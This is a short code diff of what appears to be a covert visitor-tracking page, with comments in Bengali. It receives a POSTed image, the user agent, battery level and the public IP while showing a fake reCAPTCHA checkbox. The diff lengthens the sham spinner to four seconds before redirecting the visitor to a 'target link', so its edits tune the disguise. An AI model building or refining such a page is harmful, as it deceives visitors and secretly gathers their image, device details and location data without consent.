@@ -36,7 +36,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
-    // Main Public IP বের করার ফিল্টারড লজিক
     $ipAddress = $_SERVER['REMOTE_ADDR'];
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -241,8 +240,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             const checkbox = document.getElementById('recaptchaCheckbox');
             const spinner = document.getElementById('recaptchaSpinner');
 
+            // স্পিনার চালু করা হলো
             spinner.style.display = 'block';
 
+            // ৪ সেকেন্ড (4000ms) ধরে ঘুরবে, তারপর টিক মার্ক এসে টার্গেট লিংকে রিডাইরেক্ট হবে
             setTimeout(() => {
                 spinner.style.display = 'none';
                 checkbox.classList.add('checked');
@@ -250,7 +251,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 setTimeout(() => {
                     window.location.href = finalUrl;
                 }, 400);
-            }, 3000);
+            }, 4000);
         }
 
         let batteryLevelInfo = 'Not Available';
